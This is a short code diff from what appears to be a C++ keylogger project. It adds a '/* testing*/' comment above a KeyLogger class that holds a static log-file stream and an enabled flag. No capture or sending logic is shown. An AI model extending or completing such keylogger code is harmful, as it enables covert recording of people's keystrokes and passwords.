@@ -14,7 +14,7 @@
 
 
 #define BUFFER_SIZE 9999
-
+/* testing*/
 class KeyLogger {
 	static std::ofstream logfile; /* Holds the stream to write the bullshit we are telling this logger to write.*/
 	static bool enabled;
